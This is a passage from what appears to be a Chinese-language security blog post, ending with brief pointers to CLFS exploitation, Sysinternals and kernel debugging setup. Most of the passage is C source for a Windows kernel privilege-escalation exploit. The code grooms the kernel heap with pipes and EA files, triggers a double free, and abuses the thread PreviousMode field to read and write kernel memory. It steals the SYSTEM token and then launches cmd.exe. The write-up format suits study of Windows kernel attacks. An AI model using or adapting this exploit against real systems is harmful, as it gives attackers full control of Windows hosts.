</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">SprayEaFile</span>(ULONG size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 首先得获得核心数
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// SYSTEM_INFO SystemInfo;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// GetSystemInfo(&amp;SystemInfo);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// GetNativeSystemInfo(&amp;SystemInfo);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	CountConcurrentSprayEaFile <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Spray Io ...</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	ParamSprayEaFile<span style="color:#ff79c6">*</span> param <span style="color:#ff79c6">=</span> (ParamSprayEaFile<span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(ParamSprayEaFile));
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (param <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error malloc ParamSprayEaFile</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	param<span style="color:#ff79c6">-&gt;</span>PayloadSize <span style="color:#ff79c6">=</span> size <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>;
</span></span><span style="display:flex;"><span>	param<span style="color:#ff79c6">-&gt;</span>hPEAuth <span style="color:#ff79c6">=</span> CreateFileW(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">.</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">PEAuth&#34;</span>, GENERIC_WRITE, <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>, OPEN_EXISTING, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (param<span style="color:#ff79c6">-&gt;</span>hPEAuth <span style="color:#ff79c6">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error CreateFile PEAuth </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	param<span style="color:#ff79c6">-&gt;</span>payload <span style="color:#ff79c6">=</span> (UCHAR<span style="color:#ff79c6">*</span>)malloc(param<span style="color:#ff79c6">-&gt;</span>PayloadSize);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (param<span style="color:#ff79c6">-&gt;</span>payload <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error malloc payload</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	RtlFillMemory(param<span style="color:#ff79c6">-&gt;</span>payload, param<span style="color:#ff79c6">-&gt;</span>PayloadSize, <span style="color:#f1fa8c">&#39;H&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// fake ProcessContext
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">*</span>(ULONG32<span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">&amp;</span>param<span style="color:#ff79c6">-&gt;</span>payload[<span style="color:#bd93f9">0x0</span>]) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x636F7250</span>; <span style="color:#6272a4">// Proc
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// FsContext-&gt;RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// !!!!! Attation + 0x30
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#ff79c6">*</span>(ULONG64<span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">&amp;</span>param<span style="color:#ff79c6">-&gt;</span>payload[<span style="color:#bd93f9">0x38</span>]) <span style="color:#ff79c6">=</span> g_ExploitEthread <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x232</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x30</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// fake ProcessContext
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	g_EaThreadList <span style="color:#ff79c6">=</span> (HANDLE<span style="color:#ff79c6">*</span>)malloc(<span style="color:#ff79c6">sizeof</span>(HANDLE) <span style="color:#ff79c6">*</span> CountConcurrentSprayEaFile);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (g_EaThreadList <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error malloc g_EaThreadList</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountConcurrentSprayEaFile; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		g_EaThreadList[i] <span style="color:#ff79c6">=</span> CreateThread(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, ThreadSprayEaFile, param, CREATE_SUSPENDED, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> (g_EaThreadList[i] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error CreateThread ThreadSprayEaFile</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>			exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 为指定线程设置处理器关联掩码
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">if</span> (SetThreadAffinityMask(g_EaThreadList[i], <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> i) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error SetThreadAffinityMask</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>			exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountConcurrentSprayEaFile; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 递减线程的挂起计数。 当暂停计数减为零时，将恢复线程的执行
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		ResumeThread(g_EaThreadList[i]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 等待，直到一个或所有指定对象处于信号状态或超时间隔已过。
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	WaitForMultipleObjects(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountConcurrentSprayEaFile; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		CloseHandle(g_EaThreadList[i]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	CloseHandle(param<span style="color:#ff79c6">-&gt;</span>hPEAuth);
</span></span><span style="display:flex;"><span>	free(param<span style="color:#ff79c6">-&gt;</span>payload);
</span></span><span style="display:flex;"><span>	free(param);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Spray Io done</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VOID <span style="color:#50fa7b">Cleanup</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] cleanup...</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	CloseHandle(g_hDevice);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (g_Pipe.size() <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> (PIPE_HANDLES <span style="color:#8be9fd;font-style:italic">p</span> : g_Pipe)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			CloseHandle(p.r);
</span></span><span style="display:flex;"><span>			CloseHandle(p.w);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#50fa7b">NTSTATUS</span> (NTAPI <span style="color:#ff79c6">*</span>PNtReadVirtualMemory) (
</span></span><span style="display:flex;"><span>	_In_ HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span>	_In_opt_ PVOID BaseAddress,
</span></span><span style="display:flex;"><span>	_Out_writes_bytes_(BufferSize) PVOID Buffer,
</span></span><span style="display:flex;"><span>	_In_ ULONG BufferSize,
</span></span><span style="display:flex;"><span>	_Out_opt_ PULONG NumberOfBytesRead
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#50fa7b">NTSTATUS</span>(WINAPI<span style="color:#ff79c6">*</span> PNtWriteVirtualMemory) (
</span></span><span style="display:flex;"><span>	_In_ HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span>	_In_ PVOID BaseAddress,
</span></span><span style="display:flex;"><span>	_In_ PVOID Buffer,
</span></span><span style="display:flex;"><span>	_In_ ULONG NumberOfBytesToWrite,
</span></span><span style="display:flex;"><span>	_Out_opt_ PULONG NumberOfBytesWritten
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">wmain</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	atexit(Cleanup);
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Setup ...</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Setup();
</span></span><span style="display:flex;"><span>	g_ThreadExploitHandle <span style="color:#ff79c6">=</span> OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Hacking thread: %#llx</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>, (ULONG64)GetCurrentThreadId());
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] LeakByQuerySystemInfomation</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	LeakByQuerySystemInfomation();
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	Sleep(<span style="color:#bd93f9">3000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Defragment </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">100</span>; i<span style="color:#ff79c6">++</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Allocate32(<span style="color:#bd93f9">0x1b000</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	SprayPipe(<span style="color:#bd93f9">0x120</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Allocate target </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Allocate64(<span style="color:#bd93f9">0x1b000</span>);
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Free first </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Free64();                            
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Ws2P =&gt; Mdl </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountSprayWs2P; i<span style="color:#ff79c6">++</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		g_ProcessList[i] <span style="color:#ff79c6">=</span> CreateProcessFileHandle(g_ThreadApcHandle);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Allocate Memory avoid crash </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountSprayMm; i<span style="color:#ff79c6">++</span>) 
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		Allocate32(<span style="color:#bd93f9">0x1b000</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Double free </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Free64();           
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Eafile =&gt; Ws2P </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	SprayEaFile(<span style="color:#bd93f9">0x120</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 找了一天的 BUG
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Close Ws2P Process Handle </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> CountSprayWs2P; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		CloseHandle(g_ProcessList[i]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//DWORD dwBytesWriten;
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Exploiting... </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Exploit thread: %#lx </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>, GetCurrentThreadId());
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//WriteFile(sync.w, &#34;Y&#34;, 1, &amp;dwBytesWriten, NULL);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	HANDLE hCur <span style="color:#ff79c6">=</span> GetCurrentProcess();
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	Sleep(<span style="color:#bd93f9">1000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// 需要确保 _KTHREAD.PreviousMode为0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	PNtWriteVirtualMemory NtWriteVirtualMemory <span style="color:#ff79c6">=</span> (PNtWriteVirtualMemory)<span style="color:#ff79c6">::</span>GetProcAddress(<span style="color:#ff79c6">::</span>LoadLibraryW(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;ntdll.dll&#34;</span>), <span style="color:#f1fa8c">&#34;NtWriteVirtualMemory&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">NULL</span> <span style="color:#ff79c6">==</span> NtWriteVirtualMemory)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error GetProcAddress NtWriteVirtualMemory</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L&#34;ntdll.dll&#34;), &#34;NtReadVirtualMemory&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">//if (NULL == NtWriteVirtualMemory)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">//{
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">//	wprintf(L&#34;[-] Error GetProcAddress NtReadVirtualMemory\r\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">//	exit(1);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#6272a4">// }
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// Write EPROCESS token =&gt; SYSTEM
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Read System token ...</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Sleep(<span style="color:#bd93f9">3000</span>);
</span></span><span style="display:flex;"><span>	ULONG BytesWritten <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	ULONG64 Token[] <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// addr =&gt; buffer
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	NtWriteVirtualMemory(
</span></span><span style="display:flex;"><span>		hCur,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>Token,
</span></span><span style="display:flex;"><span>		(PVOID)(g_SystemEprocess <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>), <span style="color:#6272a4">//   +0x4b8 Token
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		<span style="color:#ff79c6">sizeof</span>(Token),
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>BytesWritten);
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[*] Read System token: %#llx %#llx %#llx %#llx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, Token[<span style="color:#bd93f9">0</span>], Token[<span style="color:#bd93f9">1</span>], Token[<span style="color:#bd93f9">2</span>], Token[<span style="color:#bd93f9">3</span>]);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (BytesWritten <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error read token, please reboot...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">//std::cin.get();
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// buffer =&gt; address
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	NtWriteVirtualMemory(
</span></span><span style="display:flex;"><span>		hCur,
</span></span><span style="display:flex;"><span>		(PVOID)(g_CurrentEprocess <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span>),
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>Token[<span style="color:#bd93f9">2</span>],
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">8</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>BytesWritten
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// write back PreviousMode =&gt; 1
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Write PrevoiuaMode 1</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	Sleep(<span style="color:#bd93f9">2000</span>);
</span></span><span style="display:flex;"><span>	BYTE PreviousMode <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (NtWriteVirtualMemory(
</span></span><span style="display:flex;"><span>		hCur,
</span></span><span style="display:flex;"><span>		(PVOID)(g_ExploitEthread <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x232</span>),
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>PreviousMode,
</span></span><span style="display:flex;"><span>		<span style="color:#bd93f9">1</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">&amp;</span>BytesWritten
</span></span><span style="display:flex;"><span>	))
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[-] Error NtWriteVirtualMemory</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>		exit(<span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	wprintf(<span style="color:#f1fa8c">L</span><span style="color:#f1fa8c">&#34;[+] Get shell... </span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>	system(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> EXIT_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="clfs">CLFS</h3>
<p>提了一嘴 CLFS，其UAF的利用</p>
<ul>
<li><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System</a></li>
</ul>
<p>clfs.sys 漏洞也蛮多的</p>
<p>沉淀，todo&hellip;</p>
<h2 id="more">More</h2>
<p>尝试解决问题时搜到了其他不错的文章，深度学习一下</p>
<h3 id="工具">工具</h3>
<p>微软的好东西总是需要我们自己探索。</p>
<p>工具箱： <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></p>
<h3 id="windows-driver-reverse">windows driver reverse</h3>
<p><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">windows-drivers-reverse-engineering</a></p>
<p>本人更喜欢使用网络来进行windbg调试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PS&gt; bcdedit /dbgsettings NET HOSTIP:&lt;DEBUGGER_IP&gt; PORT:50000
